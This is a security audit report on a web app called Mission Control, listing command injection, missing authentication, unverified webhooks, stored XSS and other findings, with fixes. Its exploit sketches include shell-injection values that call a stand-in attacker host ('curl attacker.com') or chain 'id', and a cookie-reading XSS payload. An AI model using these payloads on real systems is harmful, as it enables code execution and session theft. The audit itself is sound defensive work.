# Full Security Review Report — Mission Control

**Date:** 2026-01-31  
**Scope:** Entire repository (read-only analysis)  
**Stack:** Fastify + Prisma + Vite/React + monorepo + SSE/WebSocket

---

## 1. Executive Summary

**Overall posture:** **Needs hardening**

**Top 5 risks (most exploitable / highest impact):**

1. **Command injection in GitHub service** — `gh` CLI is invoked with user-controlled `owner`, `repo`, `title`, `body`, and `comment` via string interpolation. An attacker can execute arbitrary shell commands with the API process privileges.  
   **Evidence:** `apps/api/src/services/githubService.ts` (exec + template literals).

2. **No authentication or authorization** — All API routes (tasks, audit, GitHub, SSE, test-event, clear-demo, cleanup-stale) are unauthenticated. Any client can create/update/delete tasks, read audit logs, call GitHub APIs, and wipe data.  
   **Evidence:** No auth middleware or checks in `apps/api/src/app.ts` or route files.

3. **GitHub webhook without verification** — Webhook accepts POSTs with no `X-Hub-Signature-256` verification or replay protection. Attackers can forge GitHub events and trigger task creation/updates.  
   **Evidence:** `apps/api/src/routes/github.ts` — `handleGitHubWebhook` uses `request.body as any`, no signature check.

4. **XSS via unsanitized markdown** — Task description and results are rendered with `dangerouslySetInnerHTML` and `marked()` with no sanitization. Stored XSS can run in any viewer’s browser.  
   **Evidence:** `apps/web/src/components/TaskDrawer.tsx` lines 323, 957.

5. **Dangerous unauthenticated endpoints** — `POST /api/v1/test-event` emits fake task events to all SSE clients; `DELETE /api/v1/tasks/clear-demo` deletes all tasks/audit/bot runs; `POST /api/v1/tasks/cleanup-stale` can release locks. All are publicly callable.  
   **Evidence:** `apps/api/src/app.ts` (test-event), `apps/api/src/routes/tasks.ts` (clear-demo, cleanup-stale).

**Bot-specific risk summary:**  
Bot-related flows (claim, release, heartbeat, progress, runs) are not scoped by any secret or token; any client can claim tasks, post progress, or create runs. There is no capability boundary (allowlists for paths/commands/domains), and no per-tool authorization. Audit events exist for task mutations but not for every bot action (e.g. heartbeat, progress). Session keys are client-chosen and not verified.

---

## 2. Threat Model Snapshot

| **Assets** | Tokens/keys (GITHUB_TOKEN, DATABASE_URL, WEBHOOK_URL), DB contents (tasks, audit, bot runs), user/bot data, GitHub-linked issue data, logs on disk, build artifacts. |
| **Trust boundaries** | Web client ↔ API (no auth); API ↔ DB (env DATABASE_URL); API ↔ GitHub (gh CLI + GITHUB_TOKEN); API ↔ webhook consumer (WEBHOOK_URL); Bot ↔ API (no auth). |
| **Attacker profiles** | (1) External attacker via HTTP — unauthenticated API allows full CRUD and abuse. (2) Authenticated malicious user — N/A today (no users). (3) Compromised bot / prompt injection — bot endpoints are open; forged requests can claim tasks and inject progress. (4) Supply chain — Vite/esbuild moderate advisory; deps from npm. (5) Insider — env and logs could expose tokens if not redacted. |
| **Assumptions** | Single-tenant / internal deployment; no multi-user isolation required yet; DB and API are not yet exposed to untrusted networks in production. |

---

## 3. Attack Surface Map

| **Layer** | **Items** |
|-----------|-----------|
| **HTTP API** | `GET/POST/PATCH/PUT/DELETE /api/v1/tasks/*`, `GET/POST /api/v1/audit*`, `GET/POST /api/v1/github/*`, `GET /health`, `POST /api/v1/test-event`. All unauthenticated. |
| **SSE** | `GET /api/v1/events` — no auth; all subscribers get all task/run/pulse events; `Access-Control-Allow-Origin: *`. |
| **WebSocket** | Not mounted in current `app.ts` (wsServer exists but not registered in the main Fastify app in reviewed code). |
| **Webhooks** | `POST /api/v1/github/webhook` — no signature verification. Outbound: `WEBHOOK_URL` called by webhookService (server-side). |
| **Execute flows** | GitHub service runs `gh` via `child_process.exec` with user-controlled args (repos, issues, title, body, comment). |
| **CI** | No `.github/` workflows found — no CI secrets or fork exposure to review. |
| **Data stores** | PostgreSQL (Prisma); single DB; no tenant column; no row-level isolation. |

---

## 4. Findings (Prioritized)

### Critical

**F-1: Command injection in GitHub service**

- **Category:** RCE  
- **Evidence:** `apps/api/src/services/githubService.ts`: `execAsync(\`gh api repos/${owner}/${repoName}/issues ...\`)`, `--field title="${title}"`, `--field body="${body || ''}"`, and similar for comments. `owner`, `repoName`, `title`, `body`, `comment` are derived from route params or request body.  
- **Impact:** Remote code execution as the API process user (e.g. create issue with title `"; curl attacker.com #`).  
- **Exploit sketch:** Call `POST /api/v1/github/tasks` with `github_repo: { owner: "x", name: "y; id >/tmp/pwn #" }` or craft title/description with backticks/quotes to break the shell and run arbitrary commands.  
- **Recommendation:** Stop using `exec` with string interpolation. Use `gh` as a library (e.g. `@octokit/rest`) or spawn with an array of arguments and never pass user input into the shell.  
- **Hardening:** Quick: strict allowlist for owner/repo (e.g. alphanumeric, `/`, `-` only) and escape/quote for CLI; robust: replace with Octokit and validate all inputs.

**F-2: No authentication or authorization on API**

- **Category:** AuthZ  
- **Evidence:** `apps/api/src/app.ts` registers routes with no `onRequest` auth hook. All routes in `tasks.ts`, `audit.ts`, `github.ts` use request data without any identity or permission check.  
- **Impact:** Full data breach and data manipulation: list/read/update/delete tasks, read audit logs, create GitHub issues, clear all data.  
- **Exploit sketch:** Any client can `DELETE /api/v1/tasks/clear-demo`, `GET /api/v1/audit?limit=10000`, or create tasks and claim them.  
- **Recommendation:** Implement deny-by-default auth (API key, JWT, or session). Add an `onRequest` (or per-route) hook that validates token/identity and attaches user/session; enforce permission or ownership on sensitive routes.  
- **Hardening:** Quick: API key in header for server-to-server and bot; robust: proper identity (e.g. OAuth/JWT) and role/permission checks.

**F-3: GitHub webhook without signature verification**

- **Category:** Input Validation / Data integrity  
- **Evidence:** `apps/api/src/routes/github.ts` — `handleGitHubWebhook` reads `request.body as any`, logs it, and returns 200. No `X-Hub-Signature-256` or `X-Hub-Signature` check.  
- **Impact:** Forged webhook payloads can trigger task creation/updates or abuse downstream logic.  
- **Exploit sketch:** `curl -X POST .../api/v1/github/webhook -d '{"action":"opened","repository":{...},"issue":{...}}'` to impersonate GitHub.  
- **Recommendation:** Verify `X-Hub-Signature-256` (or legacy signature) using webhook secret; reject invalid or missing signature; consider replay window (timestamp).  
- **Hardening:** Quick: verify HMAC with `WEBHOOK_SECRET`; robust: verify + reject duplicates (e.g. idempotency key or event id).

### High

**F-4: XSS via unsanitized markdown (description and results)**

- **Category:** XSS  
- **Evidence:** `apps/web/src/components/TaskDrawer.tsx` line 323: `dangerouslySetInnerHTML={{ __html: marked(text) }}`; line 957: `dangerouslySetInnerHTML={{ __html: marked.parse(task.results) }}`. `marked` by default does not sanitize HTML.  
- **Impact:** Stored XSS: attacker creates/updates a task with description or results containing `<script>...</script>` or event handlers; any user viewing the task runs the script.  
- **Exploit sketch:** PATCH task with `description: '<img src=x onerror=alert(document.cookie)>'` or use markdown that renders to script (if allowed by marked).  
- **Recommendation:** Sanitize HTML after markdown render (e.g. DOMPurify) before passing to `dangerouslySetInnerHTML`, or use a markdown renderer that only outputs safe HTML.  
- **Hardening:** Quick: `DOMPurify.sanitize(marked(text), { ALLOWED_TAGS: [...] })`; robust: allowlist tags/attrs and CSP.

**F-5: Unauthenticated destructive and abuse endpoints**

- **Category:** AuthZ / Data Leakage  
- **Evidence:**  
  - `apps/api/src/app.ts` line 56: `POST /api/v1/test-event` — emits a fake task event to all SSE clients.  
  - `apps/api/src/routes/tasks.ts` line 284: `DELETE /api/v1/tasks/clear-demo` — deletes all tasks, progress logs, state logs, audit events, bot runs.  
  - `apps/api/src/routes/tasks.ts` line 410: `POST /api/v1/tasks/cleanup-stale` — accepts `olderThanMinutes` and releases session locks.  
- **Impact:** DoS (clear all data), confusion (fake SSE events), lock release abuse.  
- **Exploit sketch:** Script repeatedly calls `DELETE .../tasks/clear-demo` or `POST .../test-event`; or call cleanup-stale with a large window to release locks.  
- **Recommendation:** Remove or restrict these endpoints: require auth and (for clear-demo) explicit env flag (e.g. `ALLOW_CLEAR_DEMO=true`) or disable in production; rate-limit or remove test-event.  
- **Hardening:** Quick: guard clear-demo and test-event by API key or NODE_ENV; robust: no public clear-demo in prod, test-event only in dev.

**F-6: CORS and SSE permissive origin**

- **Category:** Misconfig  
- **Evidence:** `apps/api/src/app.ts` line 22–25: `cors: { origin: true, credentials: true }` (accepts any origin). SSE handler (line 42): `'Access-Control-Allow-Origin': '*'`.  
- **Impact:** Any website can send credentialed requests and subscribe to SSE, enabling cross-site abuse if combined with cookies later.  
- **Exploit sketch:** Malicious site opens fetch to API with credentials and reads task/audit data; or subscribes to SSE and shows live data.  
- **Recommendation:** Set CORS `origin` to an explicit allowlist (e.g. `VITE_ORIGIN` or deployment origins). For SSE, use same origin or allowlist; avoid `*` when credentials or sensitive data are involved.  
- **Hardening:** Quick: `origin: process.env.CORS_ORIGIN || false` with explicit env; robust: allowlist array and consistent ACAO for SSE.

### Medium

**F-7: Audit and list query limits unbound**

- **Category:** Input Validation / Data Leakage  
- **Evidence:** `apps/api/src/routes/audit.ts` line 9: `limit: z.string().optional().transform(val => val ? parseInt(val) : undefined)` — no min/max. `auditService.getAllAuditEvents` uses `take: filters?.limit || 100`.  
- **Impact:** `GET /api/v1/audit?limit=999999` can stress DB and return huge payloads.  
- **Recommendation:** Cap limit (e.g. `.min(1).max(500)` or 1000) in Zod and in the service.  
- **Hardening:** Quick: `.max(500)` in schema; robust: default 50, max 200, pagination.

**F-8: Task routes with partial body/query validation**

- **Category:** Input Validation  
- **Evidence:**  
  - `POST /api/v1/tasks/:id/progress`: body not parsed with Zod; `request.body.step` and `request.body.status` used directly (`tasks.ts` 177–182).  
  - `POST /api/v1/tasks/:id/dependencies`: `request.body.dependencyTaskId` not validated (no schema parse).  
  - `POST /api/v1/tasks/:id/runs`: body cast as `{ attemptNumber?, parentRunId? }` without Zod parse.  
  - `DELETE /api/v1/tasks/:id/dependencies/:depId`: `depId` is string, not validated as UUID.  
- **Impact:** Malformed or oversized input can cause errors or unexpected behavior; dependency IDs could be non-UUID.  
- **Recommendation:** Add Zod schemas for progress body (step string length, status enum), dependency body (dependencyTaskId UUID), runs body (attemptNumber number, parentRunId UUID), and depId (UUID). Parse and reject invalid input.  
- **Hardening:** Quick: add parse() for each; robust: shared UUID/string-length limits and consistent error responses.

**F-9: Secrets and sensitive data in repo and logs**

- **Category:** Secrets / Logging  
- **Evidence:**  
  - `docker-compose.yml` line 9: `POSTGRES_PASSWORD: mission_control_secret` (and line 27 DATABASE_URL with same password).  
  - `.env.example` contains placeholder `mission_control_secret` (acceptable for example).  
  - `apps/api/src/routes/github.ts` line 93: `console.log('GitHub webhook received:', body)` — full webhook body logged (could contain secrets if GitHub sends them).  
  - Uncaught errors may expose stack traces unless Fastify error handler is configured to hide them in production.  
- **Impact:** Default DB password in repo; log leakage of tokens or PII if webhooks or errors carry them.  
- **Recommendation:** Use Docker secrets or env vars for DB password in compose; avoid committing real secrets. Redact webhook body in logs (log only event type and id); ensure production error handler does not send stack traces or env in responses.  
- **Hardening:** Quick: remove hardcoded password from compose, use env; redact webhook body; robust: structured logging with allowlisted fields and secret redaction.

**F-10: GITHUB_TOKEN fallback to empty string**

- **Category:** Misconfig  
- **Evidence:** `apps/api/src/services/githubService.ts` line 93: `new GitHubService(process.env.GITHUB_TOKEN || '')`.  
- **Impact:** If GITHUB_TOKEN is unset, `gh` may use cached or system credentials, or fail in confusing ways; empty token could be used in requests.  
- **Recommendation:** Require GITHUB_TOKEN for GitHub routes: check at startup or at first use and return 503 or 401 if missing.  
- **Hardening:** Quick: throw or disable GitHub routes when `!process.env.GITHUB_TOKEN`; robust: feature flag and clear error responses.

### Low / Informational

**F-11: Supply chain — Vite/esbuild advisory**

- **Category:** Supply Chain  
- **Evidence:** `npm audit` reports 2 moderate (esbuild via Vite — GHSA-67mh-4wv8-2f99).  
- **Impact:** Dev server may allow arbitrary requests; mainly affects local dev, not production build.  
- **Recommendation:** Track and upgrade Vite/esbuild when a fix is available; avoid running dev server in untrusted environments.  
- **Hardening:** Optional: `npm audit fix` when non-breaking; pin versions.

**F-12: .env.development not in .gitignore**

- **Category:** Secrets  
- **Evidence:** `.gitignore` has `.env`, `.env.local`, `.env.*.local` but not `.env.development`.  
- **Impact:** Risk of committing `.env.development` with real secrets.  
- **Recommendation:** Add `.env.development` to `.gitignore` if it can hold secrets, or document that it must never contain secrets.  
- **Hardening:** Add `.env.development` to ignore list if used for local secrets.

**F-13: No rate limiting**

- **Category:** Misconfig  
- **Evidence:** No `@fastify/rate-limit` or equivalent in `app.ts`.  
- **Impact:** Brute force, DoS, or abuse of expensive endpoints (GitHub, clear-demo, audit with large limit).  
- **Recommendation:** Add rate limiting (e.g. per IP or per key) with stricter limits for login-like, webhook, and mutate endpoints.  
- **Hardening:** Quick: global limit per IP; robust: per-route limits and 429 responses.

**F-14: SSE/WS no per-message auth or scope**

- **Category:** Bot Safety / AuthZ  
- **Evidence:** SSE `GET /api/v1/events` has no auth; all clients receive all task/run/pulse events. `wsServer.ts` has no auth on connect; channel subscription is client-driven (`tasks`, `runs`, `events`) with no tenant/user filter.  
- **Impact:** Any subscriber sees all tasks and runs; no multi-tenant or user-level isolation.  
- **Recommendation:** Authenticate SSE/WS on connect; filter events by identity/tenant if multi-tenant.  
- **Hardening:** Quick: same API key as REST for SSE; robust: scoped channels and server-side filtering.

**F-15: Prisma and raw SQL**

- **Category:** N/A (positive)  
- **Evidence:** No `$queryRaw`/`$executeRaw` or string-interpolated SQL found. Prisma used with parameterized queries.  
- **Recommendation:** None; maintain current practice.

---

## 5. Hardening Plan

**Immediate (today):**

- **F-1:** Stop passing user input into `exec` strings. Use Octokit or spawn with argv array and strict validation for owner/repo/title/body/comment.
- **F-3:** Verify GitHub webhook signature (HMAC with WEBHOOK_SECRET); reject invalid requests.
- **F-4:** Sanitize markdown output (DOMPurify or safe allowlist) before `dangerouslySetInnerHTML`.
- **F-5:** Remove or restrict `POST /api/v1/test-event` and `DELETE /api/v1/tasks/clear-demo` (e.g. dev-only or require API key).
- **F-9:** Remove hardcoded DB password from docker-compose; use env; redact webhook body in logs.

**Next sprint:**

- **F-2:** Add authentication (API key or JWT) and deny-by-default; protect all sensitive routes.
- **F-6:** Set CORS origin to an explicit allowlist; align SSE ACAO.
- **F-7:** Cap audit `limit` (e.g. max 500) and validate in schema.
- **F-8:** Add Zod parsing for progress, dependencies, runs, and depId.
- **F-10:** Require GITHUB_TOKEN for GitHub features; fail fast if missing.
- **F-13:** Add rate limiting (global and optionally per-route).

**Ongoing:**

- **F-11:** Track npm audit and Vite/esbuild advisories; upgrade when safe.
- **F-12:** Harden .gitignore and repo hygiene for env files.
- **F-14:** When adding multi-tenant or user identity, add SSE/WS auth and event scoping.
- **Bot safety:** Document capability boundaries; add audit records for every bot action (heartbeat, progress, tool use); consider session-key verification (e.g. signed or server-issued).

---

## 6. Verification Checklist

Use these to confirm fixes (read-only; no destructive runs):

1. **Command injection:**  
   - Search for `exec(` / `spawn(` and ensure no user input in shell string or unvalidated args.  
   - `git grep -n "execAsync\|exec(" apps/api`

2. **Auth:**  
   - Every route under `/api/v1` (except health) returns 401 when no valid token/header.  
   - Manual: `curl -X GET https://api/tasks` → 401 (or 403).

3. **Webhook:**  
   - `curl -X POST .../github/webhook -d '{}'` without valid signature → 401 or 403.  
   - Logs do not contain raw webhook body (only type/id).

4. **XSS:**  
   - Create task with description `&lt;script&gt;alert(1)&lt;/script&gt;` (or sanitized equivalent); open task — no script execution.  
   - Grep for `dangerouslySetInnerHTML` and confirm preceding sanitization.

5. **Destructive endpoints:**  
   - `DELETE .../tasks/clear-demo` without auth or without ALLOW_CLEAR_DEMO → 403 or 404.  
   - `POST .../test-event` without auth (or in prod) → 403 or removed.

6. **CORS:**  
   - Response from API has `Access-Control-Allow-Origin` set to a specific origin (or omit when not needed), not `*` for credentialed resources.

7. **Audit limit:**  
   - `GET /api/v1/audit?limit=10000` returns at most 500 (or configured max) and schema rejects limit > max.

8. **Secrets:**  
   - `git grep -n "mission_control_secret\|POSTGRES_PASSWORD"` — no hardcoded value in committed files (or only in .env.example with placeholder).  
   - `npm audit --workspaces` — review and fix or accept remaining findings.

**Definition of done for security gate:**  
All Critical and High findings have a fix or accepted risk; F-1, F-2, F-3, F-4, F-5 addressed; no raw user input in shell commands; auth on sensitive API and SSE; webhook signature verification; XSS mitigations in place; and verification steps above pass.
